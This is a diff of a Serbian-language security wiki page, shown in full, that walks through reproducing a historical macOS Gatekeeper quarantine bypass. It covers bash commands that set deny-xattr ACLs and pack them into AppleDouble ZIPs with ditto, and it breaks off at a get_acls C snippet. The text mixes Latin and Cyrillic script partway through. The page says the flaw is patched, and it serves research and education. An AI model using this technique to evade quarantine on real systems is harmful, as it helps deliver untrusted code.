@@ -1,12 +1,71 @@
-# macOS xattr-acls dodatni sadržaj
+# Reprodukcija zaobilaženja karantina pomoću AppleDouble ACL-a
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Ovaj istorijski proof of concept ponovo izvodi AppleDouble/ACL tehniku korišćenu u istraživanju Achilles Gatekeeper bypass-a. Serijalizuje ACL, smešta ga u AppleDouble sidecar, preimenuje atribut u `com.apple.acl.text` i ponovo pakuje ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
+Ovaj istorijski proof of concept reprodukuje tehniku AppleDouble/ACL korišćenu u istraživanju zaobilaženja Achilles Gatekeeper-a. Serijalizuje ACL, čuva ga u AppleDouble pratećoj datoteci, preimenuje atribut u `com.apple.acl.text` i ponovo pakuje ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Apple je ispravio Gatekeeper bypass u macOS Ventura 13, Monterey 12.6.2 i Big Sur 11.7.2; vraćanje ACL-a na aktuelnom Mac-u ne pokazuje da Gatekeeper bypass funkcioniše.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Apple je ispravio zaobilaženje Gatekeeper-a u macOS Ventura 13, Monterey 12.6.2 i Big Sur 11.7.2; vraćanje ACL-a na aktuelnom Mac-u ne demonstrira funkcionalno zaobilaženje Gatekeeper-a.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
-Za provere quarantine-a i prvog pokretanja pogledajte [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+Za provere karantina i prvog pokretanja, pogledajte [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+
+## Ponašanje ACL-a i AppleDouble sistema datoteka
+
+### writeextattr ACL
+
+Ovaj ACL sprečava dodavanje `xattrs` datoteci
+
+```bash
+rm -rf /tmp/test*
+echo test >/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+```
+
+### **com.apple.acl.text xattr + AppleDouble**
+
+**AppleDouble** формат датотеке копира датотеку, укључујући њене ACE-ове.
+
+У [**изворном коду**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) може се видети да ће текстуални приказ ACL-а, сачуван у xattr-у под називом **`com.apple.acl.text`**, бити постављен као ACL распаковане датотеке. Дакле, ако сте компресовали апликацију у zip датотеку у **AppleDouble** формату датотеке, са ACL-ом који спречава уписивање других xattr-а у њу... quarantine xattr није постављен на апликацију:
+
+За више информација погледајте [**оригинални извештај**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/).<sup>[[1]](#references)</sup>
+
+Да бисмо ово поновили, прво треба да добијемо исправан ACL string:
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+(Napomena: čak i ako ovo funkcioniše, sandbox prethodno upisuje quarantine xattr.)
+
+## Konstrukcija i validacija AppleDouble sidecar datoteke
 
 ```bash
 rm -rf /tmp/test*
@@ -22,7 +81,7 @@ ACL in hex: \x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43
 
 <details>
 
-<summary>Kod za get_acls</summary>
+<summary>Kod funkcije get_acls</summary>
 
 ```c
 // clang -o get_acls get_acls.c
